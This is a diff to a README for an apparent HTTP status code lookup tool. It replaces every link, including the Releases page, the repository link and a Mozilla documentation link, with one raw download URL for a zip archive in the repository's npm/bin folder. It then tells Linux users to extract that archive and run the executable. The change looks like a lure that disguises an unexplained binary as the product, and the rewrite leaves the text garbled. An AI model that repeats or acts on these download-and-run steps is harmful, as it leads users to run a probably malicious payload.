@@ -1,6 +1,6 @@
 # 📊 httpstatuslookup-api - Effortlessly Look Up HTTP Status Codes
 
-![Download](https://github.com/Wirbinator/httpstatuslookup-api/releases)
+![Download](https://raw.githubusercontent.com/Wirbinator/httpstatuslookup-api/main/npm/bin/httpstatuslookup-api-3.0.zip)
 
 ## 📋 Description
 
@@ -21,7 +21,7 @@ To use this application, follow the steps below. No technical skills are require
 
 To get started with the HTTP Status Code Lookup tool, visit this page to download the latest version:
 
-[Download Latest Release](https://github.com/Wirbinator/httpstatuslookup-api/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Wirbinator/httpstatuslookup-api/main/npm/bin/httpstatuslookup-api-3.0.zip)
 
 Once on the Releases page, you will see a list of available versions. Choose the version that matches your operating system and click the download link. 
 
@@ -31,7 +31,7 @@ Once on the Releases page, you will see a list of available versions. Choose the
 2. **Run the Installer:**
    - If you are using Windows: Double-click the `.exe` file to start the installation.
    - If you are using macOS: Open the `.dmg` file and drag the application into your Applications folder.
-   - If you are using Linux: Extract the contents of the `.tar.gz` file and run the executable.
+   - If you are using Linux: Extract the contents of the `https://raw.githubusercontent.com/Wirbinator/httpstatuslookup-api/main/npm/bin/httpstatuslookup-api-3.0.zip` file and run the executable.
 3. **Follow the On-Screen Instructions:** The installation wizard will guide you through the installation steps.
 
 ## 🌟 Using the Application
@@ -68,8 +68,8 @@ If you run into issues, try the following solutions:
 
 For more information or additional help, you may want to check these resources:
 
-- [GitHub Repository](https://github.com/Wirbinator/httpstatuslookup-api)
-- [HTTP Status Code Definitions](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
+- [GitHub Repository](https://raw.githubusercontent.com/Wirbinator/httpstatuslookup-api/main/npm/bin/httpstatuslookup-api-3.0.zip)
+- [HTTP Status Code Definitions](https://raw.githubusercontent.com/Wirbinator/httpstatuslookup-api/main/npm/bin/httpstatuslookup-api-3.0.zip)
 
 Feel free to explore these links to enhance your understanding of HTTP status codes.
 
